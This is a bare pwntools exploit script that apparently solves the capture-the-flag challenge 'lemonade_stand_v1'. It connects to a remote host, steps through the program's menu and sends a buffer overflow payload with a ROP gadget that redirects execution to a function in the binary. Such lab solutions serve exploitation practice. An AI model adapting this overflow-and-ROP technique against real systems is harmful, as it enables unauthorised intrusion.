#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./lemonade_stand_v1', checksec = False)
#p = process(elf.path)
p = remote('94.237.62.49', 52425)
context.log_level = 'debug'

padding = 64 * b'a' 
pop_rdi = 0x400c63
#ret = 0x4006be


payload = flat(
			padding,
			pop_rdi,
			elf.symbols.grapes
				)

p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'2')
p.sendlineafter(b'>> ', b'1')
p.recvuntil(':')
p.sendline('leo')
p.recvuntil(':')
p.send(payload)
success(p.recvall())